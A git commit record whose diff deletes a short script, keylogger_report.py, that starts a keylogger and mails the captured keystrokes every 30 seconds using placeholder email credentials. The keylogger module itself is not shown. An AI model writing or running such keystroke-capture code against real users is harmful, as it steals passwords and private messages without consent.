7ecb2440d5db98448912801fac9b417a3aa3e2ca
Fegamon <57500141+fegamon@users.noreply.github.com>
2022-08-17 23:02:08 -0500

    Delete keylogger_report.py

--- keylogger_report.py
+++
@@ -1,6 +0,0 @@
-import keylogger
-
-# 30 this indicates how many seconds the notification will be sent by
-# mail, you can to change it :D 
-keylogger = keylogger.Keylogger(30, '<base64-email>', '<base64-pass>')
-keylogger.start()
